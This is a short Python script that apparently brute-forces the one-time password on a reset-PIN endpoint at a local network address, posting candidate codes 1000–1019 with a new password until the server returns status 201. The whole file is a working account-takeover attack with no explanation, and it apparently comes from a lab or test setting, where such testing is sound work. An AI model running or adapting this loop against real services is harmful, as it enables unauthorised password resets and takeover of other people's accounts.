import requests
from tqdm import tqdm

def test(otp: str):
    url = "http://192.168.0.106/api/reset-pin/test"
    data = {
        "otp": otp,
        "password": "password"
    }
    response = requests.post(url, json=data)
    print(response.text)
    return response.status_code == 201

for i in tqdm(range(1000, 1020)):
    if test(str(i)):
        print(i)
        break